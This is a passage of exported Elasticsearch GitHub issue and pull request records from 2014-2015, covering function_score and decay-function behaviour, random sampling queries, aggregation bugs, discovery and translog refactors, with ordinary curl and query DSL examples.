</comment><comment author="synhershko" created="2014-10-30T02:15:49Z" id="61036329">@martijnvg any ETA on a fix for this?
</comment><comment author="sandstrom" created="2014-11-05T18:40:42Z" id="61858664">I've got a possibly similar issue, where the function is improperly run against some results/documents, causing an 'unknown field' error.

```
# This query is run against two indices, 'users' and 'speakers'.
# But I think the situation would be the same if it was a single index, 
# with two different types in it.
# 
# I get the following error:
# `QueryParsingException[[users] Unknown field [mentioned_at]];`
#
# It seems like it's trying to run the query against all results, 
# instead of being scoped to the query.
# All speakers has the `mentioned_at` field, and no user has it.

query_body = {
  :query =&gt; {
    :bool =&gt; {
      :should =&gt; [
        {
          :function_score =&gt; {
            :query =&gt; {
              :multi_match =&gt; {
                :query =&gt; "MY QUERY HERE",
                :type =&gt; :phrase_prefix,
                :fields =&gt; ['name']
              }
            },
            :filter =&gt; { :type =&gt; { :value =&gt; 'speaker' } },
            :functions =&gt; [
              {
                :gauss =&gt; {
                  'mentioned_at' =&gt; {
                    :scale =&gt; '180d', # '6M' syntax couldn't be used, probably due to ES-bug
                    :offset =&gt; '5d',
                    :decay =&gt; 0.5,
                  }
                }
              }
            ]
          }
        },
        {
          :filtered =&gt; {
            :query =&gt; {
              :multi_match =&gt; {
                :query =&gt; "MY QUERY HERE",
                :type =&gt; :phrase_prefix,
                :fields =&gt; ['name']
              }
            },
            :filter =&gt; { :type =&gt; { :value =&gt; 'user' } },
          }
        }
      ]
    }
  }
}
```
</comment><comment author="martijnvg" created="2014-11-24T10:39:42Z" id="64176104">@synhershko Sorry, I missed your comment... This issue should be resolved by #4081, internally this issue will change the fact that there are multiple mappings per type, so there will be one mapping per index.

Right now because in the url your scope has been reduced to the parent type and no other query can therefor in scripting access fields outside of this scope. This restriction should be removed when #4081 is added.

The best work around right now is to not define type in the url and do this in the query dsl instead.
</comment><comment author="martijnvg" created="2014-11-24T10:42:31Z" id="64176382">@sandstrom This is because your query runs on an index that simply doesn't have that field and the function_score quest is strict about that.

I think the best way to get around this issue is to wrap the function_score query in the `indices` query and restrict on what indices the sub query is actually ran on:
http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/query-dsl-indices-query.html#query-dsl-indices-query
</comment><comment author="sandstrom" created="2014-11-24T15:49:30Z" id="64213279">@martijnvg Doesn't `filter` run before the `query`?

My guess was that `function_score` can take either a `query` or a `filter`, but not both. There is a `|` in the documentation, which I'm guessing signifies a bitwise OR.

http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/query-dsl-function-score-query.html#_using_function_score
</comment><comment author="martijnvg" created="2014-11-24T16:48:32Z" id="64223697">@sandstrom This depends on what place the filter is defined. If the filter is defined in the query dsl via a `filtered` query it depends, but if it is defined in `post_filter` then the filter is always checked last.

Yes, the `function_score` query can either accept a filter or a query. If both are defined then the last one parsed will actually be used.
</comment><comment author="sandstrom" created="2014-11-24T18:44:22Z" id="64242127">@martijnvg Thanks for confirming my guess, much appreciated! :boat: 

I've opened a separate issue to track that: https://github.com/elasticsearch/elasticsearch/issues/8638
</comment><comment author="clintongormley" created="2015-11-21T19:04:47Z" id="158672745">As of 2.0 this now works correctly, eg:

```
POST /test/pages/_search
{
  "query": {
    "has_child": {
      "score_mode": "max",
      "type": "tagged-page",
      "query": {
        "function_score": {
          "boost_mode": "replace",
          "query": {
            "term": {
              "name": "foo"
            }
          },
          "script_score": {
            "lang": "groovy",
            "script": "doc[\"score\"].value"
          }
        }
      }
    }
  }
}
```
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update ZenDiscovery fields via the cluster service update task.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7790</link><project id="" key="" /><description>On join, update the latestDiscoNodes, master flag and fault detection via a cluster state update task.

This should prevent rare concurrency issues, where during a join the cluster state master node can't be seen from the join thread.
</description><key id="43141949">7790</key><summary>Update ZenDiscovery fields via the cluster service update task.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">martijnvg</reporter><labels><label>:Discovery</label><label>enhancement</label><label>resiliency</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-18T14:54:42Z</created><updated>2015-06-07T12:01:41Z</updated><resolved>2014-09-26T12:10:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-09-19T07:39:19Z" id="56146183">I like the direction - left some comments 
</comment><comment author="martijnvg" created="2014-09-26T12:10:23Z" id="56953184">Closed in favour for #7834
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Create Backwards Compatiblity Tests for Templates</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7789</link><project id="" key="" /><description>We should create a backwards compatibility test for templates so that we don't hjork things going forward with new changes,
</description><key id="43138094">7789</key><summary>Create Backwards Compatiblity Tests for Templates</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">GaelTadh</reporter><labels><label>:Indexed Scripts/Templates</label><label>adoptme</label><label>test</label></labels><created>2014-09-18T14:21:07Z</created><updated>2016-11-25T18:47:15Z</updated><resolved>2016-11-25T18:47:15Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-12-08T11:14:28Z" id="66102788">@GaelTadh can you take a look at this at some point too?
</comment><comment author="clintongormley" created="2016-11-25T18:47:15Z" id="263010231">We have these now</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Decay functions handle missing field as "perfect" hits</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7788</link><project id="" key="" /><description>Assume an index with persons and their ages in it. The age is optional:

```
curl -X PUT 'http://localhost:9200/test'
curl -X PUT 'http://localhost:9200/test/person/1' -d '{ "name": "Alpha", "age": 20 }'
curl -X PUT 'http://localhost:9200/test/person/2' -d '{ "name": "Beta", "age": 30 }'
curl -X PUT 'http://localhost:9200/test/person/3' -d '{ "name": "Gamma" }'
```

When I now try to find people that are around the age of 22 with a Gaussian decay function, I would naturally expect Gamma _not_ to appear in the search results, or at least with a low score.

However, Gamma receives the score `1`:

```
curl -X GET 'http://localhost:9200/test/person/_search?pretty' -d '{ "query": { "function_score": { "functions": [ { "gauss": { "age": { "origin": 22, "scale": 5, "decay": 0.5 } } } ] } } }'
```

The query pretty printed:

```
{
  "query": {
    "function_score": {
      "functions": [
        {
          "gauss": {
            "age": {
              "origin": 22,
              "scale": 5,
              "decay": 0.5
            }
          }
        }
      ]
    }
  }
}
```

The resulting hits:

```
[
  {
    "_index" : "test",
    "_type" : "person",
    "_id" : "3",
    "_score" : 1.0,
    "_source":{ "name": "Gamma"}
  }, {
    "_index" : "test",
    "_type" : "person",
    "_id" : "1",
    "_score" : 0.8950251,
    "_source":{ "name": "Alpha", "age": 20 }
  }, {
    "_index" : "test",
    "_type" : "person",
    "_id" : "2",
    "_score" : 0.16957554,
    "_source":{ "name": "Beta", "age": 30 }
  }
]
```

The explanation of the query gives the following formulas:
- Gamma: `exp(-0.5*pow(MIN of: [0.0],2.0)/18.033688011112044)`
- Alpha: `exp(-0.5*pow(MIN of: [Math.max(Math.abs(20.0(=doc value) - 22.0(=origin))) - 0.0(=offset), 0)],2.0)/18.033688011112044)`

When the field is present, it's absolute distance from `origin` is used as the input to the decay function. However, if the field is missing, the value `0` is used, implying a perfect hit.

My expectation would be that the decay function does not even receive the input but the function score query automatically returns a score of `0` if the field is missing.
</description><key id="43137372">7788</key><summary>Decay functions handle missing field as "perfect" hits</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">phjardas</reporter><labels /><created>2014-09-18T14:14:38Z</created><updated>2014-09-30T09:40:22Z</updated><resolved>2014-09-29T17:25:43Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="phjardas" created="2014-09-18T14:29:11Z" id="56046126">IMHO the problem lies in DecayFunctionParser returning 0 as the distance, if no fields are found:

https://github.com/elasticsearch/elasticsearch/blob/9addac830089e48bdcd77a5cc972d85808d863e5/src/main/java/org/elasticsearch/index/query/functionscore/DecayFunctionParser.java#L376
</comment><comment author="brwe" created="2014-09-18T15:11:45Z" id="56052922">Yes, it is like you say. It is also [documented](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/query-dsl-function-score-query.html#_what_if_a_field_is_missing) but rather hidden at the very end of the docs.

&gt; My expectation would be that the decay function does not even receive the input but the function score query automatically returns a score of 0 if the field is missing.

I am not convinced that this is always expected. Also, there is an easy workaround: Just add additional function with a missing filter and put in whatever value you like. Would that work for you?
</comment><comment author="phjardas" created="2014-09-24T12:40:26Z" id="56663521">@brwe could you please explain how this workaround would look like? I'm not sure I understand your proposal correcly. Thanks!
</comment><comment author="clintongormley" created="2014-09-29T17:25:43Z" id="57196342">@phjardas this is what @brwe means:

```
{
  "query": {
    "function_score": {
      "score_mode": "first",
      "functions": [
        {
          "filter": {
            "exists": {
              "field": "age"
            }
          },
          "gauss": {
            "age": {
              "origin": 22,
              "scale": 5,
              "decay": 0.5
            }
          }
        },
        {
          "script_score": {
            "script": "0"
          }
        }
      ]
    }
  }
}
```
</comment><comment author="phjardas" created="2014-09-30T09:40:22Z" id="57289553">Thanks @clintongormley for the explanation!

NB: this would require dynamic scripts to be enabled, of course.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Cleaned up various issues</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7787</link><project id="" key="" /><description>Some cleanup to close issues around the indexed scripts API

This closes : 
#7560
#7568
#7559
#7647
#7567
</description><key id="43137226">7787</key><summary>Cleaned up various issues</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">GaelTadh</reporter><labels><label>:Indexed Scripts/Templates</label><label>bug</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-18T14:13:19Z</created><updated>2015-06-07T18:12:48Z</updated><resolved>2014-09-19T11:19:57Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-18T14:16:21Z" id="56044223">those are good cleanups - can we get them into `1.4` ? I think we should also add a simple BWC test for templates in a different PR
</comment><comment author="GaelTadh" created="2014-09-18T14:53:08Z" id="56050005">I created issue #7789 to track the BWC test for templates.
</comment><comment author="s1monw" created="2014-09-18T20:42:28Z" id="56099597">left some more comments
</comment><comment author="s1monw" created="2014-09-19T10:15:27Z" id="56159940">@GaelTadh I removed the review tag just FYI
</comment><comment author="GaelTadh" created="2014-09-19T10:38:35Z" id="56161817">I made the updates.
</comment><comment author="s1monw" created="2014-09-19T10:39:16Z" id="56161876">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[DOC] Add GET Alias API note to breaking changes</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7786</link><project id="" key="" /><description>Note explains that GET Alias API now supports IndicesOptions and will error if a index is missing
</description><key id="43136823">7786</key><summary>[DOC] Add GET Alias API note to breaking changes</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>docs</label></labels><created>2014-09-18T14:09:26Z</created><updated>2014-10-21T21:40:29Z</updated><resolved>2014-09-18T14:13:59Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-09-18T14:11:04Z" id="56043422">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add option to take currently relocating shards' sizes into account</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7785</link><project id="" key="" /><description>When using the DiskThresholdDecider, it's possible that shards could
already be marked as relocating to the node being evaluated. This commit
adds a new setting `cluster.routing.allocation.disk.include_relocations`
which adds the size of the shards currently being relocated to this node
to the node's used disk space.

This new option defaults to `true`, however, it's possible to
over-estimate the usage for a node if the relocation is already
partially complete, for instance:

A node with a 10gb shard that's 45% of the way through a relocation
would add 10gb + (.45 \* 10) = 14.5gb to the node's disk usage before
examining the watermarks to see if a new shard can be allocated.

Fixes #7753
Relates to #6168
</description><key id="43134178">7785</key><summary>Add option to take currently relocating shards' sizes into account</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">dakrone</reporter><labels><label>:Allocation</label><label>enhancement</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-18T13:45:12Z</created><updated>2015-03-19T09:20:28Z</updated><resolved>2014-09-19T10:47:53Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="gibrown" created="2014-09-18T15:42:16Z" id="56057806">Because running out of disk space is such a hard failure condition I'd suggest that this should be the default behavior. Temporarily over-estimating seems safer to me.

Great improvement though. Thanks!
</comment><comment author="grantr" created="2014-09-18T16:53:06Z" id="56068696">I also favor safety over accuracy by default. @dakrone what would the example situation that you mention ultimately resolve to? Would the same shards still be allocated, but slower than usual?
</comment><comment author="s1monw" created="2014-09-19T10:21:38Z" id="56160445">I left a minor comment. I think we should move to `true` as the default. I completely agree that the safer option is preferable. Other than that LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[TEST] Make it possible to customize whether the REST tests are run by d...</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7784</link><project id="" key="" /><description>We currently run REST tests by default. There might be third parties that use our test infra and don't want to run REST tests by default, especially since they need some additional configuration for spec and tests that are not shipped with the tests jar file. In those cases we might want to customize the value for the property that controls whether REST tests are run by default or not.

This change makes it possible to change the default value from a static block like the following:

```
static {
    ElasticsearchRestTests.REST_TESTS_ENABLED_BY_DEFAULT = false;
}
```
</description><key id="43132896">7784</key><summary>[TEST] Make it possible to customize whether the REST tests are run by d...</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>non-issue</label><label>test</label></labels><created>2014-09-18T13:32:44Z</created><updated>2014-09-18T13:54:03Z</updated><resolved>2014-09-18T13:53:16Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-18T13:53:16Z" id="56040913">this is a non-issue you can just pass the `-Dtests.rest=false` or you define that in the `pom.xml`
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Feature: add simple or even weighted random sampling of documents</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7783</link><project id="" key="" /><description>It would be useful to be able to obtain a random sample from an elasticsearch index, i.e. to issue a query that retrieves any document from a given index with probability 1/N (where N is the number of documents currently indexed).

Even better, if all documents have some numeric field s, it would be useful to have a weighted random sampling, i.e. where the probability to get document i with value i.s is equal to 

i.s / sum(j.s for document j in index)
</description><key id="43124984">7783</key><summary>Feature: add simple or even weighted random sampling of documents</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">k0ala</reporter><labels><label>discuss</label><label>feature</label></labels><created>2014-09-18T12:04:17Z</created><updated>2015-12-07T10:56:42Z</updated><resolved>2014-11-28T10:39:21Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="brwe" created="2014-09-19T11:28:50Z" id="56165663">You could use two nested function_score queries, one with a random and one with a script:

```
POST testidx/_search
{
  "query": {
    "function_score": {
      "query": {
        "function_score": {
          "functions": [
            {
              "random_score": {
                "seed": 1
              }
            }
          ]
        }
      },
      "functions": [
        {
          "script_score": {
            "script": "if (_score.doubleValue() &gt; 0.5) {return 1;} else {return 0;}"
          }
        }
      ],
      "boost_mode": "replace"
    }
  }
}
```

The first would give you a reproducible random and the script could then be used to determine if the document should be in the sample or not (replace 0.5 with `1/num documents` or `doc[field].value/sum values`). 
However, there is currently no way to actually exclude documents with a particular score from the result set, see https://github.com/elasticsearch/elasticsearch/issues/6952 . You would have to check in the returned documents if they have a score 1 or 0 in the above example.
There is no way to figure out the sum of values for documents on the fly, you would need to execute an aggregation before that. Likewise in the script you cannot get the number of indexed docs (`_index.numDocs()` only returns number of docs in shard) so you would have to figure that out in advance and pass as parameter to the script.

Would that help you?
</comment><comment author="k0ala" created="2014-09-19T15:10:06Z" id="56190112">Hi brwe, thanks for your comment!

What you suggest is useful, although it doesn't quite achieve what I am after. If I use your approach with `1/N`, then I will sometimes get 0 documents, or sometimes several documents (if I understood correctly). What I am after is a method that will get me exactly 1 document each time.
</comment><comment author="brwe" created="2014-09-22T07:02:25Z" id="56335522">Thanks for the explanation. I think now I understand better and what I wrote does not make a lot of sense on second thought...

For samples of fixed size I still think you can just use plain `random_score`. `random_score` assigns random numbers that should be uniformly distributed between 0 and 1 so if you want to draw a sample of fixed size (potentially 1) from documents and assume they are all equally likely then I think you can just use `random_score` and get the top n documents which would then be your sample. Does that make sense?

This might indeed be useful to have for non uniform distributions as well.
</comment><comment author="brwe" created="2014-10-16T15:02:21Z" id="59375579">@ibaiul your last comment seems to have gotten lost. can you add it again?
</comment><comment author="clintongormley" created="2014-11-28T10:39:21Z" id="64880008">No more feedback.  This seems quite easily doable by:
- generating a random score for each document
- multiplying that score by the value of a numeric field in each document
- limiting the size to 1

Closing
</comment><comment author="dpaluy" created="2015-12-07T10:54:46Z" id="162481971">I need to get some documents from a given index with weighted probability `Wj/&#931;Wi` (where `Wj` is a weight of item `j` and `Wj/&#931;Wi` is a sum of weights of all documents in this query).

Each item stored in ES, has `id`, `category_id` and `weight`.

I guess that my function should be like:

```
"script_score": {
  "script": "weight = data['weight'].value / SUM; if (_score.doubleValue() &gt; weight) {return 1;} else {return 0;}"
}
```

How to calculate the total sum of the query results?

My current query (w/o weighted probability) is:

```
GET products/_search?pretty=true
{"size":5,
  "query": {
    "function_score": {
      "query": {
        "bool":{
          "must": {
            "term":
              {"category_id": "5df3ab90-6e93-0133-7197-04383561729e"}
          }
        }
      },
      "functions":
        [{"random_score":{}}]
    }
  },
  "sort": [{"_score":{"order":"desc"}}]
}
```

Thanks a lot for help!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>cardinality cost high memory</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7782</link><project id="" key="" /><description>when i query with "
{
  "aggs": {
    "hid_count": {
      "cardinality": { 
        "field": "hid"
      }
    }
  }
}"
in distribute model to get distinct values count (2 billion of  30 billion record) , the memory cost is very high.
The another question is how can i to disable "score" when indexing and query. 
</description><key id="43122615">7782</key><summary>cardinality cost high memory</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">JingpengZhang</reporter><labels /><created>2014-09-18T11:31:42Z</created><updated>2014-09-25T18:33:30Z</updated><resolved>2014-09-25T18:33:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-25T18:33:30Z" id="56863020">Please see `precision_threshold` on http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/search-aggregations-metrics-cardinality-aggregation.html
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Discovery: Remove redundant unsetting of the master flag</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7781</link><project id="" key="" /><description /><key id="43120551">7781</key><summary>Discovery: Remove redundant unsetting of the master flag</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">martijnvg</reporter><labels /><created>2014-09-18T11:02:17Z</created><updated>2015-05-18T23:30:05Z</updated><resolved>2014-09-18T14:55:28Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-09-18T14:55:28Z" id="56050417">Superseded by #7790
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Refactor the Translog.read(Location) method</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7780</link><project id="" key="" /><description>It was only used by `readSource`, it has been changed to return a
Translog.Operation, which can have .getSource() called on it to return
the source. `readSource` has been removed.

This also removes the checked IOException, any exception thrown is
unexpected and should throw a runtime exception.

Moves the ReleasableBytesStreamOutput allocation into the body of the
try-catch block so the lock can be released in the event of an exception
during allocation.
</description><key id="43119024">7780</key><summary>Refactor the Translog.read(Location) method</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dakrone/following{/other_user}', u'events_url': u'https://api.github.com/users/dakrone/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dakrone/orgs', u'url': u'https://api.github.com/users/dakrone', u'gists_url': u'https://api.github.com/users/dakrone/gists{/gist_id}', u'html_url': u'https://github.com/dakrone', u'subscriptions_url': u'https://api.github.com/users/dakrone/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/19060?v=4', u'repos_url': u'https://api.github.com/users/dakrone/repos', u'received_events_url': u'https://api.github.com/users/dakrone/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dakrone/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dakrone', u'type': u'User', u'id': 19060, u'followers_url': u'https://api.github.com/users/dakrone/followers'}</assignee><reporter username="">dakrone</reporter><labels><label>:Translog</label><label>enhancement</label><label>v1.4.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-18T10:40:55Z</created><updated>2015-06-07T12:01:50Z</updated><resolved>2014-09-29T08:24:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-09-18T10:43:47Z" id="56022432">LGTM
</comment><comment author="s1monw" created="2014-09-18T14:21:16Z" id="56044934">I left some comments
</comment><comment author="s1monw" created="2014-09-24T20:01:41Z" id="56729537">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Multiple dateRange aggregations produce wrong results</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7779</link><project id="" key="" /><description>I'm testing  the ElasticSearch 1.3.2.
When testing the dateRange aggregation query, I found that two buckets with same predicate produce the different result. it seems strange.

here's a example below

```
curl -XGET 'http://localhost:9200/_all/logs/_search?search_type=count' -d '{
    "aggs": {
        "rxxxx": {
            "date_range": {
                "field": "@timestamp",
                "ranges": [
                    { "from": "now-1h"},{ "from": "now-5m" },{ "from": "now-1h" }
                ]
            }
        }
    }
}'
```

result

```
{
    "took": 55,
    "timed_out": false,
    "_shards": {
        "total": 15,
        "successful": 15,
        "failed": 0
    },
    "hits": {
        "total": 8119472,
        "max_score": 0.0,
        "hits": []
    },
    "aggregations": {
        "rxxxx": {
            "buckets": [{
                "key": "2014-09-18T09:15:08.073Z-*",
                "from": 1.411031708073E12,
                "from_as_string": "2014-09-18T09:15:08.073Z",
                "doc_count": 523450
            }, {
                "key": "2014-09-18T10:10:08.073Z-*",
                "from": 1.411035008073E12,
                "from_as_string": "2014-09-18T10:10:08.073Z",
                "doc_count": 523450
            }, {
                "key": "2014-09-18T09:15:08.073Z-*",
                "from": 1.411031708073E12,
                "from_as_string": "2014-09-18T09:15:08.073Z",
                "doc_count": 30200
            }]
        }
    }
}
```
</description><key id="43118073">7779</key><summary>Multiple dateRange aggregations produce wrong results</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/jpountz/following{/other_user}', u'events_url': u'https://api.github.com/users/jpountz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/jpountz/orgs', u'url': u'https://api.github.com/users/jpountz', u'gists_url': u'https://api.github.com/users/jpountz/gists{/gist_id}', u'html_url': u'https://github.com/jpountz', u'subscriptions_url': u'https://api.github.com/users/jpountz/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/299848?v=4', u'repos_url': u'https://api.github.com/users/jpountz/repos', u'received_events_url': u'https://api.github.com/users/jpountz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/jpountz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'jpountz', u'type': u'User', u'id': 299848, u'followers_url': u'https://api.github.com/users/jpountz/followers'}</assignee><reporter username="">arbil</reporter><labels><label>bug</label></labels><created>2014-09-18T10:28:14Z</created><updated>2015-11-21T18:57:43Z</updated><resolved>2015-11-21T18:57:43Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-10-09T09:41:23Z" id="58485618">@arbil Thanks for reporting this bug. Something that looks weird to me is that the buckets went back out of order here while the range aggregator is supposed to sort them (to make lookups faster using a binary search). So it almost looks like the counts are good but not the labels (which I neither understand nor can reproduce yet). Is the bug 100% reproducible?
</comment><comment author="clintongormley" created="2015-11-21T18:57:43Z" id="158672346">No feedback in over a year. Closing
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Check if from + size don't cause overflow and fail with a better error</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7778</link><project id="" key="" /><description>Closes #7774 
</description><key id="43117899">7778</key><summary>Check if from + size don't cause overflow and fail with a better error</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">martijnvg</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-18T10:26:19Z</created><updated>2015-06-07T10:33:04Z</updated><resolved>2014-09-20T10:49:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-20T09:38:34Z" id="56262611">@martijnvg wanna get this in?
</comment><comment author="martijnvg" created="2014-09-20T10:50:05Z" id="56264458">@s1monw done :)
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Aggregations: Fix regression bug for the support of terms aggregation on the `_parent` field.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7777</link><project id="" key="" /><description>This bug appears in unreleased code (1.4, 1.x and master branches).
</description><key id="43115043">7777</key><summary>Aggregations: Fix regression bug for the support of terms aggregation on the `_parent` field.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">martijnvg</reporter><labels><label>bug</label><label>regression</label></labels><created>2014-09-18T09:51:33Z</created><updated>2015-05-18T23:30:05Z</updated><resolved>2014-09-18T10:29:22Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-18T10:08:31Z" id="56019303">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Added example of sysctl.conf for file descriptors change</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7776</link><project id="" key="" /><description>I added an example of the sysctl.conf change required for file descriptors
